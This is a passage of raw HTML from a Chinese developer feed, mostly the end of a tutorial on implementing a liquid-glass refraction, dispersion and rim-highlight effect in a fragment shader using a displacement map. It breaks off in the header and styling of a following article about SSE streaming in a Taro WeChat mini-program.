class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 则光线不会发生折射，而是被<a href="https://link.juejin.cn?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FTotal_internal_reflection" target="_blank" title="https://en.wikipedia.org/wiki/Total_internal_reflection" ref="nofollow noopener noreferrer">完全反射</a>回去；</li>
<li>当入射光线与表面正交时，无论折射率如何，它都会（沿着法线方向）直线穿过。</li>
</ul>
<h3 data-id="heading-3">2.2 位移向量场</h3>
<p>当光线穿入玻璃介质产生折射后，会在底部产生位移向量（见下图的紫色箭头）：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/009dbf87ec7043e3aa541276f86fcb50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=YarKkCtrptfn1%2Fmvc1vvTrYix9E%3D" alt="4.gif" loading="lazy"/></p>
<p>可以看到，光线产生折射越大时，其位移向量就越大；直到靠近玻璃中心位置时，由于光线与玻璃表面正交，不再产生折射，其位移向量长度归零。</p>
<p>假设光线射入的是一块正圆形的玻璃凸透镜，则所有射入镜内的光线所产生的位移向量场如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7eb0ec7fa2314a7cae2ce01cdf3e5bef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=foCGRxWaByZ3uTHLgVYKP8OG3Iw%3D" alt="5.gif" loading="lazy"/></p>
<p>留意上图的箭头都为了可见性而进行了归一化处理，进而缩小了比例，因此它们不会重叠。</p>
<blockquote>
<p>和法线向量的「归一化」不同，此处的「归一化」并非将每个向量除以自身的长度，而是统一除以向量场内最长向量的长度。这般处理后的向量才能保留彼此之间的长度比例信息。</p>
</blockquote>
<p>我们在之前《<a href="https://juejin.cn/post/7542792170685825078" target="_blank" title="https://juejin.cn/post/7542792170685825078">法线贴图和高度贴图</a>》一文已学习过「如何将归一化向量转化为贴图色值」，今天也将异曲同工地对位移向量做类似的事情。</p>
<p>由于光线折射后的位移向量仅处于玻璃最底部的平面，因此每个向量仅在 X 轴和 Y 轴存在走向，且归一化后的值被限定在 <code>[-1, 1]</code> 区间，因此仅使用 RGBA 中的 R 和 G 两个通道来存储这两个轴向值即可：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>R</mi><mi>G</mi><mo>=</mo><mn>128</mn><mo>+</mo><mi>N</mi><mi>o</mi><mi>r</mi><mi>m</mi><mi>a</mi><mi>l</mi><mo>∗</mo><mn>127</mn></mrow><annotation encoding="application/x-tex">RG = 128 + Normal * 127</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">RG</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">128</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.02778em;">or</span><span class="mord mathnormal">ma</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">127</span></span></span></span></span></div>
<p>假设 B 通道值固定为 <code>0</code>，A 通道固定为 <code>255</code>，则每个归一化向量的色值相当于在「零向量色」 <code>RGBA(127, 127, 0, 255)</code> 上增减相应的 R 和 G 值：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7477d0ad2f84538bcec1f83fd4eb4ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=lfClw3K7VEWgFEoR10ANRC%2F33Sg%3D" alt="6.gif" loading="lazy"/></p>
<p>那么一个正圆形凸透镜，其归一化位移向量场贴图（displacement map），可以是这样的：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0318d20622ec4f69963a16d64fdafab4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=h%2FhRbj21Zd9OznsCp3vyE60mpsY%3D" alt="7.png" loading="lazy"/></p>
<blockquote>
<p>💡 我制作了一个<a href="https://link.juejin.cn?target=https%3A%2F%2Fvajoy.github.io%2Fdm-generate%2Findex.html%3Fy%3D3" target="_blank" title="https://vajoy.github.io/dm-generate/index.html?y=3" ref="nofollow noopener noreferrer">工具页面</a>，可以在页面上轻松生成、下载各种形状的位移向量场贴图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ed32ab4a9fb49138f65fbe567ffda58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=z2%2B1YazaqOiAUPC36zqpExTPKgw%3D" alt="8.gif" loading="lazy"/></p>
</blockquote>
<p>拥有了信息化贴图，我们便可以通过着色器捕获、逆向这些信息，再进一步做 UV 偏移，来实现光线折射、画面被扭曲的效果。</p>
<h3 data-id="heading-4">2.3 色散与轮廓高光</h3>
<p>不同颜色的光，在玻璃里传播的速度不同，因此折射程度也不同，折射偏移越大的区域越容易产生「色散」现象，从而呈现出一种色彩分层的视觉效果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b93c4d9a2dd4eba8df43c1bf4b8d6fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=BM5H5kjte1%2BjCcK5s5j6VG%2B0tng%3D" alt="9.jpg" loading="lazy"/></p>
<p>在《<a href="https://juejin.cn/post/7517085209327484928" target="_blank" title="https://juejin.cn/post/7517085209327484928">滤镜的实现</a>》一文中我们已经实现了一个 <code>glitchEffect</code> 故障效果方法，可以参考此方法，根据位移向量场贴图的 R、G 通道值的大小，来决定不同程度的色值偏移，从而达成玻璃边缘色散的视觉效果。</p>
<p>另外，当光线以特定角度照射时，会在玻璃物体看到一些明亮的边缘反射：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fcafeaccf22e4f3884f4396aecce30eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=9g02vKrFl8r%2FJBRLroaWl0Sl4%2F0%3D" alt="9.gif" loading="lazy"/></p>
<p>苹果公司对此的实现，是给液态玻璃图标添加一圈简单的轮廓高光，令其质感更贴近玻璃的同时，也更好地让图标与外界做边界区分：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe5bcdddca1c45f5a7a2fb406b2be6ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=0KNcR2FBoFsuDAaXAygQlA3EN5E%3D" alt="11.png" loading="lazy"/></p>
<h2 data-id="heading-5">三、着色器实现</h2>
<h3 data-id="heading-6">3.1 折射的实现</h3>
<p>光线的折射在着色器中通常表现为 UV 的偏移（这也是《<a href="https://juejin.cn/post/7544388006720471094" target="_blank" title="https://juejin.cn/post/7544388006720471094">UV 扰动动画</a>》的实现原理），借助位移向量场贴图，可以高效地获得 UV 的偏移值。</p>
<p>我们先把背景和前置的玻璃物体位移向量场贴图，分别捕获为两个离屏的 Render Texture：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bc434aa26194ad495a917d9a5409a80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=hoyJfJntiO8fl8mObwDfQv2hFo8%3D" alt="image.png" loading="lazy"/></p>
<p>接着新建一个 <code>Sprite</code> 组件节点 <code>Composition</code>，绑定着色器（<code>liquid-glass.effect</code>）来获取这两个 Render Texture（用于后面的合成处理）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/** liquid-glass.effect 片元着色器示例 **/</span>

<span class="hljs-title class_">CCProgram</span> fs %{
  precision highp float;
  <span class="hljs-keyword">in</span> vec2 uv;

  uniform sampler2D bgRT;  <span class="hljs-comment">// 背景 RenderTexture</span>
  uniform sampler2D displacementMapRT;  <span class="hljs-comment">// 位移向量场贴图 RenderTexture</span>

  vec4 frag () {
    vec4 bgColor = <span class="hljs-title function_">texture</span>(bgRT, uv);
    vec4 dispColor = <span class="hljs-title function_">texture</span>(displacementMapRT, uv);
    
    <span class="hljs-keyword">return</span> bgColor;  <span class="hljs-comment">// 直接返回背景色（暂无任何扭曲处理）</span>
  }
}%
</code></pre>
<p>在获取到位移向量场贴图的色值后（取值区间 <code>[0.0, 1.0]</code>），我们需要将其「逆向」为原本的归一化向量（取值区间 <code>[-1.0, 1.0]</code>）：</p>
<pre><code class="hljs language-js" lang="js">vec2 offsetNormal = dispColor.<span class="hljs-property">xy</span> * <span class="hljs-number">2.0</span> - <span class="hljs-number">1.0</span>;  <span class="hljs-comment">// RG 映射到 [-1, 1]</span>
</code></pre>
<p>由于逆向后的归一化向量的取值为 <code>[-1, 1]</code>，对于 UV 而言是一个较大的数值，直接使用 <code>offsetNormal</code> 作为 UV 偏移值会导致非常夸张的背景扭曲，因此需要新增一个 <code>strengthUV</code> 参数（默认值为 <code>0.03</code>）来缩小 UV 偏移值到合理的范畴：</p>
<pre><code class="hljs language-js" lang="js">uniform <span class="hljs-variable constant_">UBO</span> {
    float strengthUV;  <span class="hljs-comment">// 默认值 0.03</span>
};

vec2 offsetNormal = dispColor.<span class="hljs-property">xy</span> * <span class="hljs-number">2.0</span> - <span class="hljs-number">1.0</span>;

float canvasScale = <span class="hljs-number">1280.0</span> / <span class="hljs-number">720.0</span>;  <span class="hljs-comment">// 1280x720 是 Canvas、bgRT 和 displacementMapRT 的宽高</span>
vec2 offsetUV = offsetNormal * strengthUV * <span class="hljs-title function_">vec2</span>(<span class="hljs-number">1.0</span>, -canvasScale);  <span class="hljs-comment">// UV 需要偏移的量</span>
vec2 baseUV = uv + offsetUV;  <span class="hljs-comment">// 偏移 UV</span>

vec4 bgColor = <span class="hljs-title function_">texture</span>(bgRT, baseUV);

<span class="hljs-keyword">return</span> bgColor; 
</code></pre>
<blockquote>
<p>留意第 8 行给 Y 轴的偏移乘以了画布的宽高比 <code>canvasScale</code>，以此确保 X 轴和 Y 轴的偏移幅度不会产生拉伸（毕竟本案例的画布及其对应的 UV 并非正方形）。</p>
<p>同时 Y 轴的偏移还乘以了 <code>-1</code>，确保位移矢量在垂直方位能符合正确的 UV 方位（指向中心）。</p>
</blockquote>
<p>此时执行效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f7884bdf9b84a61a457f931ac9c2ee9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=GZ81dyQ%2BKU3%2Bej7U4so%2FaIliX5U%3D" alt="11.gif" loading="lazy"/></p>
<h3 data-id="heading-7">3.2 色散的实现</h3>
<p>色散的实现其实比想象的简单，只需要根据 UV 偏移量 <code>offsetUV</code>，进一步左右偏移背景色的 R 和 B 通道即可，同时新增 <code>dispersionStrength</code> 参数（默认值为 <code>0.03</code>）来控制色散偏移的强度：</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-comment">// 色散效果，把 R 和 B 色值分别左右偏移</span>
    vec4 rC = <span class="hljs-title function_">texture</span>(bgRT, baseUV + offsetUV * dispersionStrength);
    vec4 gC = <span class="hljs-title function_">texture</span>(bgRT, baseUV);
    vec4 bC = <span class="hljs-title function_">texture</span>(bgRT, baseUV - offsetUV * dispersionStrength);

    <span class="hljs-keyword">return</span> <span class="hljs-title function_">vec4</span>(rC.<span class="hljs-property">r</span>, gC.<span class="hljs-property">g</span>, bC.<span class="hljs-property">b</span>, <span class="hljs-number">1.0</span>);
</code></pre>
<p>执行效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3de3487b432f44d999afe16f334307af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=l5u1TTs2AjusMyAXWPiR55hObgQ%3D" alt="12.gif" loading="lazy"/></p>
<p>为了提升性能，我们可以仅在需要色散的时候才对 R 和 B 通道进行采样：</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-comment">// 色散效果，把 R 和 B 色值分别左右偏移</span>
    vec4 gC = <span class="hljs-title function_">texture</span>(bgRT, baseUV);
    vec4 rC = gC;
    vec4 bC = gC;

    <span class="hljs-keyword">if</span> (dispersionStrength &gt; <span class="hljs-number">0.0</span>) {
      <span class="hljs-comment">// 需要开启色散效果再采样 R B 通道，提升性能</span>
      rC = <span class="hljs-title function_">texture</span>(bgRT, baseUV + offsetUV * dispersionStrength);
      bC = <span class="hljs-title function_">texture</span>(bgRT, baseUV - offsetUV * dispersionStrength);
    }

    vec4 dispersionColor = <span class="hljs-title function_">vec4</span>(rC.<span class="hljs-property">r</span>, gC.<span class="hljs-property">g</span>, bC.<span class="hljs-property">b</span>, <span class="hljs-number">1.0</span>);
</code></pre>
<h3 data-id="heading-8">3.3 轮廓光的实现</h3>
<p>实现轮廓光最简单粗暴的方案，是在形状节点之上叠加一个 PNG 图层节点，但本文将更加高效的、直接在着色器内部实现。</p>
<p>由于光线折射产生的位移向量，在越靠近边缘的部分其矢量长度是越大的，那我们可以先通过 <code>length</code> 函数获得位移矢量长度，然后判断其值是否大于指定的阈值，若是则返回纯白色的轮廓光：</p>
<pre><code class="hljs language-js" lang="js">  uniform <span class="hljs-variable constant_">UBO</span> {
    float strengthUV; 
    float dispersionStrength; 
    float highlightStrength;   <span class="hljs-comment">// 新增轮廓光强度参数（默认值为 0.1，范围 `[0.0, 0.2]`）</span>
  };
  
  
    <span class="hljs-comment">// 轮廓光实现</span>
    float normalLen = <span class="hljs-title function_">length</span>(offsetNormal);  <span class="hljs-comment">// 获得归一化位移矢量长度，区间为 [0.0, 1.0]</span>

    <span class="hljs-keyword">if</span> (normalLen &lt; <span class="hljs-number">1.0</span> - highlightStrength) {
      <span class="hljs-comment">// 位移向量长度低于指定阈值，无需轮廓光</span>
      <span class="hljs-keyword">return</span> dispersionColor;
    }

    float highlightOpacity = <span class="hljs-number">1.0</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">vec4</span>(<span class="hljs-number">1.0</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">1.0</span>, highlightOpacity);
</code></pre>
<p>由于 <code>offsetNormal</code> 是归一化后的向量，其长度 <code>normalLen</code> 注定落在 <code>[0.0, 1.0]</code> 区间中，因此可以设定一个阈值（<code>highlightStrength</code>）来圈定产生轮廓光的区域。</p>
<p>执行上述代码，可以获得一个相较粗糙的实心轮廓光：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b30dfa949fe4ebe9a2713425d3eaf4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=Sqov4kkkqEGuCj1lf0tl9R2Ei%2Bg%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>受限于位移向量场贴图精度，计算获得的轮廓光粗细可能不均，且可能存在些许偏移。</p>
</blockquote>
<p>然而我们需要的并非一个完整且实心的轮廓光，我们需要的是一个对称的、透明度线性渐变的轮廓光，而这块的处理可以从位移向量场贴图上的色值获取线索：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d28c1f3aa63b485c8effec5835b90622~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=oJaLSkflgjin7ufO9dQ07Jkn7BE%3D" alt="15.jpg" loading="lazy"/></p>
<p>可以看到位移向量场贴图的 R 或 G 通道值，均是线性渐变的，例如 G 通道的值，会从最顶部的 <code>255</code> 沿着边缘线性递减到最左侧的 <code>128</code>。</p>
<p>因此我们可以用位于左上角的 G 通道值 <code>191</code> 来作为左半球轮廓光的中点（完全不透明度），其左右两侧 G 通道值 <code>±50</code> 的点为轮廓光的边缘（完全透明度），进而实现一个位于左上角的渐变轮廓光：</p>
<pre><code class="hljs language-js" lang="js">    float highlightOpacity = <span class="hljs-number">0.0</span>;
    float leftCenterG = <span class="hljs-number">191.0</span> / <span class="hljs-number">255.0</span>;  <span class="hljs-comment">// 玻璃物体左侧轮廓光中心对应的 G 值，要先转换到 [0.0, 1.0] 区间，才能与区间为 [0.0, 1.0] 的 dispColor.g 进行对比</span>
    float rightCenterG = <span class="hljs-number">1.0</span> - leftCenterG; <span class="hljs-comment">// 玻璃物体右侧轮廓光中心对应的 G 值</span>
    float spanG = <span class="hljs-number">50.0</span> / <span class="hljs-number">255.0</span>;  <span class="hljs-comment">// 轮廓光范围对应的 G 值，当 leftCenterG ± spanG 时，轮廓光透明度为 0</span>
    
    <span class="hljs-keyword">if</span> ((offsetNormal.<span class="hljs-property">x</span> &gt; <span class="hljs-number">0.0</span>) &amp;&amp; (dispColor.<span class="hljs-property">g</span> &lt; leftCenterG + spanG) &amp;&amp; (dispColor.<span class="hljs-property">g</span> &gt; leftCenterG - spanG)) {
      <span class="hljs-comment">// 位移向量在水平方位指向右侧，说明处于玻璃物体左侧</span>
      highlightOpacity = <span class="hljs-title function_">clamp</span>(<span class="hljs-number">1.0</span> - <span class="hljs-title function_">abs</span>(dispColor.<span class="hljs-property">g</span> - leftCenterG) / spanG, <span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>);
    }
    
    vec4 highlightColor = <span class="hljs-title function_">vec4</span>(<span class="hljs-number">1.0</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">1.0</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">mix</span>(dispersionColor, highlightColor, highlightOpacity);
</code></pre>
<p>执行效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf944730ef3b4141959f25e88be06125~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=bKvgNGD8N3bYamTvqXvN4dmYphA%3D" alt="16.jpg" loading="lazy"/></p>
<p>同理，我们可以算出右下角的渐变轮廓光：</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-keyword">if</span> ((offsetNormal.<span class="hljs-property">x</span> &gt; <span class="hljs-number">0.0</span>) &amp;&amp; (dispColor.<span class="hljs-property">g</span> &lt; leftCenterG + spanG) &amp;&amp; (dispColor.<span class="hljs-property">g</span> &gt; leftCenterG - spanG)) {
      <span class="hljs-comment">// 位移向量在水平方位指向右侧，说明处于玻璃物体左侧</span>
      highlightOpacity = <span class="hljs-title function_">clamp</span>(<span class="hljs-number">1.0</span> - <span class="hljs-title function_">abs</span>(dispColor.<span class="hljs-property">g</span> - leftCenterG) / spanG, <span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((offsetNormal.<span class="hljs-property">x</span> &lt; <span class="hljs-number">0.0</span>) &amp;&amp; (dispColor.<span class="hljs-property">g</span> &lt; rightCenterG + spanG) &amp;&amp; (dispColor.<span class="hljs-property">g</span> &gt; rightCenterG - spanG)) {
      <span class="hljs-comment">// 位移向量在水平方位指向左侧，说明处于玻璃物体右侧</span>
      highlightOpacity = <span class="hljs-title function_">clamp</span>(<span class="hljs-number">1.0</span> - <span class="hljs-title function_">abs</span>(dispColor.<span class="hljs-property">g</span> - rightCenterG) / spanG, <span class="hljs-number">0.0</span>, <span class="hljs-number">1.0</span>);
    }
</code></pre>
<p>执行效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88d5240eb6fd4025a1eebb7ddbe5df13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=w5Qfq3TA7p2iKtKbQ2NsUcibq3w%3D" alt="17.gif" loading="lazy"/></p>
<p>至此，我们借助位移向量场贴图的能力，在单个 DrawCall 中仅使用了最多 4 次采样，便高效地实现了一个带有扭曲、色散和轮廓光的液态玻璃效果。</p>
<p>该着色器也适用于其它形状，读者可以在<a href="https://link.juejin.cn?target=https%3A%2F%2Fvajoy.github.io%2Fshader-demo%2Findex.html%3Fv%3D20" target="_blank" title="https://vajoy.github.io/shader-demo/index.html?v=20" ref="nofollow noopener noreferrer">线上案例演示页</a>查看完整的动态效果和获取源码：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d2ff76fa23f419a8addfa432e100880~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVmFKb3k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558237&amp;x-signature=goCwf%2F%2FYgtP0l3SymUFxdLfqC4E%3D" alt="18.gif" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 Taro + 微信小程序实现大模型流式响应（SSE）：最全实践指南]]></title>    <link>https://juejin.cn/post/7575367791273639974</link>    <guid>https://juejin.cn/post/7575367791273639974</guid>    <pubDate>2025-11-24T01:02:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575367791273639974" data-draft-id="7574991051435147274" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 Taro + 微信小程序实现大模型流式响应（SSE）：最全实践指南"/> <meta itemprop="keywords" content="微信小程序,Taro,LLM"/> <meta itemprop="datePublished" content="2025-11-24T01:02:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="namehu"/> <meta itemprop="url" content="https://juejin.cn/user/993614243829768"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 Taro + 微信小程序实现大模型流式响应（SSE）：最全实践指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614243829768/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    namehu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T01:02:26.000Z" title="Mon Nov 24 2025 01:02:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li 